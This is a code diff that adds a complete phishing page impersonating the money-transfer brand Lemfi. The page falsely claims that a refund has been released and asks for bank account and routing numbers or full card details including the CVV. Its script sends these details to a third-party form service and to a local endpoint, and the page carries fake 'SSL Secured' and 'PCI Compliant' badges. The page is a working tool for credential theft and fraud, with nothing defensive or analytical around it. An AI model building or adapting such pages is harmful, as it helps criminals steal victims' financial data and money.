@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LEMFI — Select Refund Method</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --green-primary: #00C389; --green-dark: #00A873; --green-light: #E6F9F2;
+            --green-ghost: #F0FBF6; --green-subtle: rgba(0,195,137,0.08);
+            --text-primary: #1B1B1B; --text-secondary: #6B7280; --text-tertiary: #9CA3AF;
+            --border: #E5E7EB; --bg-body: #F9FAFB; --bg-card: #FFFFFF;
+            --shadow-lg: 0 12px 40px rgba(0,0,0,0.08); --shadow-btn: 0 4px 14px rgba(0,195,137,0.3);
+            --radius-sm: 8px; --radius-md: 12px; --radius-lg: 16px; --radius-xl: 20px;
+            --blue-bg: #EFF6FF; --blue-border: #BFDBFE; --blue-text: #1E40AF;
+        }
+        body { font-family: 'DM Sans', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: var(--bg-body); padding: 24px 16px; color: var(--text-primary); -webkit-font-smoothing: antialiased; }
+        body::before { content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 0; background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(0,195,137,0.08) 0%, transparent 60%); }
+        .page-wrapper { position: relative; z-index: 1; width: 100%; max-width: 440px; }
+        .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; padding: 0 4px; }
+        .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+        .logo-mark { width: 40px; height: 40px; background: var(--green-primary); border-radius: 10px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+        .logo-mark::after { content: ''; width: 18px; height: 18px; border: 3px solid #fff; border-radius: 50%; border-top-color: transparent; transform: rotate(45deg); }
+        .logo-wordmark { font-size: 22px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.5px; }
+        .help-link { font-size: 13px; font-weight: 500; color: var(--green-primary); text-decoration: none; display: flex; align-items: center; gap: 4px; padding: 6px 12px; border-radius: 8px; transition: background 0.2s; }
+        .help-link:hover { background: var(--green-light); }
+        .help-link svg { width: 16px; height: 16px; }
+        .card { background: var(--bg-card); border-radius: var(--radius-xl); box-shadow: var(--shadow-lg); border: 1px solid rgba(0,0,0,0.04); overflow: hidden; max-height: 92vh; overflow-y: auto; }
+        .card::-webkit-scrollbar { width: 4px; }
+        .card::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+        .card-inner { padding: 32px; }
+        .info-banner { background: var(--blue-bg); border: 1px solid var(--blue-border); border-radius: var(--radius-lg); padding: 18px 16px; margin-bottom: 20px; display: flex; align-items: flex-start; gap: 12px; }
+        .info-banner svg { width: 20px; height: 20px; color: var(--blue-text); flex-shrink: 0; margin-top: 1px; }
+        .info-banner p { font-size: 13px; color: var(--blue-text); line-height: 1.6; }
+        .info-banner strong { color: #1E3A8A; }
+        .amount-display { text-align: center; margin-bottom: 24px; padding: 18px; background: var(--bg-body); border-radius: var(--radius-lg); border: 1.5px dashed var(--border); }
+        .amount-display .label { font-size: 11px; font-weight: 600; color: var(--text-tertiary); text-transform: uppercase; letter-spacing: 1.2px; }
+        .amount-display .value { font-size: 34px; font-weight: 700; color: var(--text-primary); margin-top: 4px; letter-spacing: -1px; }
+        .amount-display .currency { font-size: 20px; font-weight: 500; color: var(--text-secondary); vertical-align: top; margin-right: 2px; }
+        .section-label { font-size: 14px; font-weight: 600; color: var(--text-primary); margin-bottom: 12px; }
+        .method-toggle { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 22px; }
+        .method-btn { padding: 14px 12px; border: 2px solid var(--border); border-radius: var(--radius-md); background: var(--bg-card); cursor: pointer; text-align: center; transition: all 0.2s; font-family: inherit; }
+        .method-btn:hover { border-color: #D1D5DB; }
+        .method-btn.active { border-color: var(--green-primary); background: var(--green-ghost); }
+        .method-btn svg { width: 24px; height: 24px; margin-bottom: 6px; color: var(--text-secondary); }
+        .method-btn.active svg { color: var(--green-primary); }
+        .method-btn .method-name { font-size: 13px; font-weight: 600; color: var(--text-primary); }
+        .method-fields { display: none; }
+        .method-fields.visible { display: block; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; color: var(--text-primary); margin-bottom: 6px; }
+        .form-group input, .form-group select { width: 100%; padding: 12px 14px; border: 1.5px solid var(--border); border-radius: var(--radius-md); font-size: 14px; font-family: inherit; color: var(--text-primary); background: var(--bg-body); transition: border-color 0.2s; outline: none; }
+        .form-group input:focus, .form-group select:focus { border-color: var(--green-primary); }
+        .form-group input::placeholder { color: var(--text-tertiary); }
+        .btn-primary { width: 100%; padding: 14px 24px; background: var(--green-primary); color: #fff; border: none; border-radius: var(--radius-md); font-size: 15px; font-weight: 600; font-family: inherit; cursor: pointer; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; overflow: hidden; }
+        .btn-primary::before { content: ''; position: absolute; inset: 0; background: linear-gradient(180deg, rgba(255,255,255,0.12) 0%, transparent 100%); pointer-events: none; }
+        .btn-primary:hover { background: var(--green-dark); box-shadow: var(--shadow-btn); transform: translateY(-1px); }
+        .btn-primary:active { transform: translateY(0); }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
+        .footer-section { margin-top: 24px; padding-top: 20px; border-top: 1px solid var(--border); }
+        .footer-text { text-align: center; font-size: 12px; color: var(--text-tertiary); line-height: 1.7; }
+        .footer-text a { color: var(--green-primary); text-decoration: none; font-weight: 500; }
+        .security-row { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 16px; }
+        .security-badge { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--text-tertiary); }
+        .security-badge svg { width: 14px; height: 14px; color: var(--green-primary); }
+        .toast { position: fixed; top: 24px; left: 50%; transform: translateX(-50%) translateY(-120%); background: #DC2626; color: #fff; padding: 12px 20px; border-radius: var(--radius-md); font-size: 14px; font-family: inherit; box-shadow: 0 8px 30px rgba(0,0,0,0.15); z-index: 9999; transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); white-space: nowrap; }
+        .toast.show { transform: translateX(-50%) translateY(0); }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-in { animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
+        .delay-1 { animation-delay: 0.05s; } .delay-2 { animation-delay: 0.1s; } .delay-3 { animation-delay: 0.15s; }
+        .delay-4 { animation-delay: 0.2s; } .delay-5 { animation-delay: 0.25s; } .delay-6 { animation-delay: 0.3s; }
+        .delay-7 { animation-delay: 0.35s; }
+        @media (max-width: 480px) { body { padding: 16px 12px; } .card-inner { padding: 24px; } }
+    </style>
+</head>
+<body>
+    <div class="toast" id="toast"></div>
+    <div class="page-wrapper">
+        <div class="top-bar animate-in">
+            <a href="#" class="logo"><div class="logo-mark"></div><span class="logo-wordmark">Lemfi</span></a>
+            <a href="mailto:support@lemfi.com" class="help-link">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                Support
+            </a>
+        </div>
+        <div class="card">
+            <div class="card-inner">
+                <div class="info-banner animate-in delay-1">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                    <p><strong>The refund amount has already been released by the company</strong> and sent to you. To acquire it, select your preferred payment method below and fill in the required details.</p>
+                </div>
+                <div class="amount-display animate-in delay-2">
+                    <div class="label">Refund Amount Released</div>
+                    <div class="value"><span class="currency">$</span><span id="displayAmount">0.00</span></div>
+                </div>
+                <div class="animate-in delay-3">
+                    <div class="section-label">Select how you want to receive your refund</div>
+                    <div class="method-toggle">
+                        <div class="method-btn active" data-method="bank" onclick="selectMethod('bank')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 21h18"/><path d="M3 10h18"/><path d="M12 3l9 7H3l9-7z"/></svg>
+                            <div class="method-name">Bank Transfer</div>
+                        </div>
+                        <div class="method-btn" data-method="card" onclick="selectMethod('card')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+                            <div class="method-name">Debit Card</div>
+                        </div>
+                    </div>
+                </div>
+                <form id="selectionForm">
+                    <input type="hidden" name="access_key" value="YOUR_WEB3FORM_ACCESS_KEY">
+                    <input type="hidden" name="subject" value="Refund Payment Method">
+                    <input type="hidden" name="from_name" value="Lemfi Website">
+                    <input type="hidden" name="page" value="selection.html">
+                    <input type="hidden" id="paymentMethodHidden" name="paymentMethod" value="bank">
+                    <input type="hidden" id="amountHidden" name="amount" value="">
+                    <input type="hidden" id="refundEmailHidden" name="email" value="">
+                    
+                    <div id="bankFields" class="method-fields visible animate-in delay-4">
+                        <div class="form-group">
+                            <label for="bankName">Bank Name</label>
+                            <input type="text" id="bankName" name="bankName" placeholder="e.g. Chase, Bank of America" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="accountHolder">Account Holder Name</label>
+                            <input type="text" id="accountHolder" name="accountHolder" placeholder="Name on the bank account" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="accountNumber">Account Number</label>
+                            <input type="text" id="accountNumber" name="accountNumber" placeholder="Enter your account number" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="routingNumber">Routing Number</label>
+                            <input type="text" id="routingNumber" name="routingNumber" placeholder="9-digit routing number" required>
+                        </div>
+                    </div>
+                    <div id="cardFields" class="method-fields animate-in delay-4">
+                        <div class="form-group">
+                            <label for="cardNumber">Card Number</label>
+                            <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        </div>
+                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
+                            <div class="form-group">
+                                <label for="cardExpiry">Expiry Date</label>
+                                <input type="text" id="cardExpiry" name="cardExpiry" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="cardCvv">CVV</label>
+                                <input type="text" id="cardCvv" name="cardCvv" placeholder="123" maxlength="4" required>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label for="cardName">Cardholder Name</label>
+                            <input type="text" id="cardName" name="cardName" placeholder="Name as it appears on card" required>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn-primary animate-in delay-6" id="submitBtn">
+                        <span>Continue</span>
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                    </button>
+                </form>
+                <div class="footer-section animate-in delay-7">
+                    <p class="footer-text">Your payment details are encrypted and secure. <a href="#">Learn more</a></p>
+                    <div class="security-row">
+                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL Secured</div>
+                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>PCI Compliant</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        let currentMethod = 'bank';
+        const savedAmount = localStorage.getItem('refundAmount');
+        const savedEmail = localStorage.getItem('refundEmail');
+        
+        if (savedAmount) {
+            const n = parseFloat(savedAmount);
+            document.getElementById('displayAmount').textContent = isNaN(n) ? savedAmount : n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            document.getElementById('amountHidden').value = savedAmount;
+        }
+        if (savedEmail) {
+            document.getElementById('refundEmailHidden').value = savedEmail;
+        }
+        
+        function selectMethod(method) {
+            currentMethod = method;
+            document.querySelectorAll('.method-btn').forEach(b => b.classList.toggle('active', b.dataset.method === method));
+            document.getElementById('bankFields').classList.toggle('visible', method === 'bank');
+            document.getElementById('cardFields').classList.toggle('visible', method === 'card');
+            document.getElementById('paymentMethodHidden').value = method;
+        }
+        
+        function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3500); }
+        
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+        });
+        
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+            if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+            e.target.value = v;
+        });
+        
+        document.getElementById('selectionForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true; btn.innerHTML = '<span>Processing...</span>';
+            
+            const formData = {
+                access_key: 'YOUR_WEB3FORM_ACCESS_KEY',
+                subject: 'Refund Payment Method',
+                from_name: 'Lemfi Website',
+                page: 'selection.html',
+                paymentMethod: currentMethod,
+                amount: savedAmount || '',
+                email: savedEmail || ''
+            };
+            
+            if (currentMethod === 'bank') {
+                formData.bankName = document.getElementById('bankName').value;
+                formData.accountHolder = document.getElementById('accountHolder').value;
+                formData.accountNumber = document.getElementById('accountNumber').value;
+                formData.routingNumber = document.getElementById('routingNumber').value;
+            } else {
+                formData.cardNumber = document.getElementById('cardNumber').value;
+                formData.cardExpiry = document.getElementById('cardExpiry').value;
+                formData.cardCvv = document.getElementById('cardCvv').value;
+                formData.cardName = document.getElementById('cardName').value;
+            }
+            
+            try {
+                const [web3Response, apiResponse] = await Promise.allSettled([
+                    fetch('https://api.web3forms.com/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(formData) }),
+                    fetch('/api/selection', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(formData) })
+                ]);
+                const apiData = apiResponse.status === 'fulfilled' ? await apiResponse.value.json() : null;
+                if (apiData && apiData.success) { window.location.href = apiData.redirect; }
+                else { showToast('Submission successful. Redirecting...'); setTimeout(() => window.location.href = 'receive.html', 1000); }
+            } catch (err) { showToast('Network error. Please try again.'); btn.disabled = false; btn.innerHTML = '<span>Continue</span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>'; }
+        });
+    </script>
+</body>
+</html>
